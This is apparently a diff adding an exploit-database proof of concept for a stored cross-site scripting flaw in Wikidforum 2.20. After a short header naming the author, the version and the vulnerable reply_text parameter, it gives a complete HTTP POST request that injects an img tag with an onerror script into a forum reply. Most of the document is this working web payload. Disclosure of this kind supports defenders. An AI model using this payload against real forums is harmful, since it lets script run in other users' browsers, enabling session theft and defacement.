@@ -1,0 +1,28 @@
+# Exploit Title: Wikidforum 2.20 - Cross-Site Scripting
+# Date: 2018-10-10
+# Exploit Author: Amir Hossein Mahboubi
+# Vendor Homepage: https://sourceforge.net/projects/wikidforum/
+# Software Link: https://sourceforge.net/projects/wikidforum/files/Wikidforum-com-ed.2.20.zip/download
+# Version: <=2.20(Latest)
+# Tested on: Linux & Windows
+
+# Vulnerable POST parameter: reply_text
+# HTTP Requests for injecting XSS as post comment:
+# Pre condition: A loged in user can post comment, signup is possible for everyone
+
+POST /test/exploit-db/wikidforum/rpc.php HTTP/1.1
+Host: localhost:85
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: application/json, text/javascript, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:85/test/exploit-db/wikidforum/faq_1/forum-setup_8/requirements-for-installing-wikidforum_2.html
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 250
+Cookie: PHPSESSID=5cnpc1euun68t8st3c9p1dsal5
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+  
+action=applications/post/rpc.php&mode=submit_reply&title=Re: Requirements for installing WikidForum&parent_post_id=2&category_id=8&last_order_id=1&reply_text=<p><img src="/test/exploit-db/wikidforum/uploads/amir.jpg" onerror="alert(1)" alt="6" /></p>
